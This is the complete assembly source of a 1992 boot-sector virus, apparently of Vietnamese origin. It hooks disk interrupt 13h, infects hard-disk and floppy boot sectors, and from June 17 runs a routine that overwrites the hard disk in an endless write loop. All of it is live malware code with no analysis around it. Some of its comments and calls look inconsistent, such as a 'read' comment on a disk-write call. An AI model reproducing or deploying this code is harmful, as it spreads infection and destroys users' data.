; ========================================
;  The BOOT XXX version 1.00 of Vietnam
;  Author     : Vu Minh Phuong
;  Last UpDate: XX.XX.1992
; ========================================
  CallInt13      MACRO
                 Pushf
                 Call  DWord ptr Old_13_Ofs
                 Jz    Loc_Ret_1
                 ENDM
; ========================================
  CODE   SEGMENT BYTE Public
         ASSUME  CS:CODE, DS: CODE
                 ORG      00h
; ========================================
  START:
                                          ;Restore BOOT original in MEM
                 Push  DS
                 Push  CS
                 Pop   DS                 ;DS = CS
                 Pop   ES                 ;ES = 0000
                 Mov   SI,Offset SaveBOOT
                 Mov   DI,Here_In_BOOT
                 Add   DI,7C00h
                 Mov   CX,Offset SaveBOOT-StepCode
                 CLD
                 Rep   Movsb
                                          ;Set interrupt to self
                 Call  SetInt13
                                          ;Reset from HD ?
                 Cmp   DL,80h
                 Je    NoTestHD
                                          ;Test HD and infect BOOT of HD
                 Call  InfectHD
           NoTestHD:
                 Mov   Word ptr WhatDo,0000
                                          ;What's date ?
                 Mov   AH,04
                 Int   1Ah
                 Cmp   DH,06
                 Jne   Loc_RETF
                 Cmp   DL,17
                 Jb    Loc_RETF
                                          ;Destroying
                 Mov   WhatDo,0FFFFh
                                          ;Go to BOOT original in MEM
           Loc_RETF:
                 DB  0EAh,00,7Ch,00,00    ;JMP far 0000:7C00
; ========================================
  SetInt13:
                 CLI
                 Mov   AX,Offset MyInt13
                 XCHG  ES:[004Ch],AX
                 Mov   Old_13_Ofs,AX
                 Mov   AX,CS
                 XCHG  ES:[004Eh],AX
                 Mov   Old_13_Seg,AX
                 STI
                 Retn
; ========================================
  Destroy:
                 Xor   AX,AX
                 Mov   ES,AX
                 Mov   DX,0080h
                 Mov   CX,0001
           Back:
                 Mov   AX,03F0h
                 Pushf
                 Call  DWord ptr Old_13_Ofs
                 Jc    Back
                 CLI
                 Inc   CH
                 Jmp   Back
                 Nop
; ========================================
  Infect:
                                          ;Read BOOT
                 CLI
                 Mov   BX,0200h
                 Mov   CX,0001
                 Mov   DX,Disk
                 Mov   SI,03
           Loop_1:
                 Dec   SI
                 Jnz   Loc_Ret_1
                 Mov   AX,0201h
                 CallInt13
                                          ;Test size of sector
                 Cmp   Word ptr ES:[BX+0Bh],200h
                 Jne   Loc_Ret_1
                                          ;Test ID of Vir
                 Mov   AL,ES:[BX+1]
                 Xor   AH,AH
                 Add   AX,202h
                 Mov   Here_In_BOOT,AX
                 Add   AX,Offset SaveBOOT - Offset StepCode - 2
                 Mov   DI,AX
                 Cmp   Word ptr ES:[DI],1967h
                 Je    Loc_Ret_1
                                          ;Save part of BOOT
                 Mov   CX,Offset SaveBOOT-StepCode
                 Mov   SI,Here_In_BOOT
                 Mov   DI,Offset SaveBOOT
                 CLD
                 Rep   Movsb
                                          ;There is code of Step
                 Mov   CX,Offset SaveBOOT-StepCode
                 Mov   SI,Offset StepCode
                 Mov   DI,Here_In_BOOT
                 Rep   Movsb
                                          ;Disk parameters
                 Mov   DX,Disk
                 Mov   AH,08
                 CallInt13
                 Mov   DL,Byte ptr Disk
                 Mov   SaveDX,DX
                 Mov   SaveCX,CX
                                          ;Save VIR
                 Xor   BX,BX
                 Mov   AX,0301h
                 Pushf
                 CallInt13
                                          ;Infects BOOT of disk
                 Mov   AX,0301h
                 Mov   BX,0200h
                 Mov   DX,Disk            ;Disk and Side of BOOT
                 Mov   CX,0001
                 CallInt13
           Loc_Ret_1:
                 STI
                 Retn
; ========================================
  InfectHD:                               ;HD parameters
                 Mov   DX,0180h
                 Mov   Word ptr Disk,DX
                 Mov   AH,08
                 CallInt13
                                          ;Infect BOOT of HD
                 Jmp   Infect
; ========================================
  InfectFD:
                 Push  AX
                 Push  BX
                 Push  CX
                 Push  DX
                 Push  SI
                 Push  DI
                 Push  ES
                 Push  DS
                                          ;DS=ES=CS
                 Push  CS
                 Pop   DS
                 Push  DS
                 Pop   ES
                                          ;Infect BOOT of FD
                 Xor   DH,DH
                 Mov   Disk,DX
                 Call  Infect
                                          ;Restore
                 Pop   DS
                 Pop   ES
                 Pop   DI
                 Pop   SI
                 Pop   DX
                 Pop   CX
                 Pop   BX
                 Pop   AX
                 Retn
; ========================================
;  Int 13h handle
; ========================================
  MyInt13:
                                          ;Read diskete?
                 Cmp   DL,80h
                 Jnb   Nothing_0
                 Cmp   AH,02h
                 Jne   Nothing_1
                 Call  InfectFD
                                          ;Destroying
           Nothing_0:
                 Cmp   Word ptr CS:WhatDo,0FFFFh
                 Jne   Nothing_1
                 Call  Destroy
           Nothing_1:
                 Jmp   DWord ptr Old_13_Ofs
; ========================================
;  DATA interface
; ========================================
  Old_13_Ofs     DW  1234h
  Old_13_Seg     DW  5678h
  Disk           DW  0000h
  WhatDo         DW  0000h
  Here_In_BOOT   DW  0000h
; ========================================
  StepCode:
                                          ;Allocate memory
                 Xor   AX,AX
                 Mov   BX,AX
                 Mov   DS,AX
                 Sub   Word ptr DS:[0413h],1
                                          ;Where am I ?
                 Mov   AX,DS:[0413h]
                 Mov   CL,06
                 Shl   AX,CL
                 Mov   ES,AX
                 Push  ES
                 Push  DS
                                          ;Read VIR to MEM
                 DB    0BAh               ;Mov DX,SaveDX
  SaveDX         DW    0000h
                 DB    0B9h               ;Mov CX,SaveCX
  SaveCX         DW    0000h
                 Mov   AX,0301h
                 Int   13h
                 RETF
                 DW    1967h
; ========================================
  SaveBOOT       DB  Offset SaveBOOT-StepCode DUP (0)
; ========================================

  CODE           ENDS
                 END   START
                 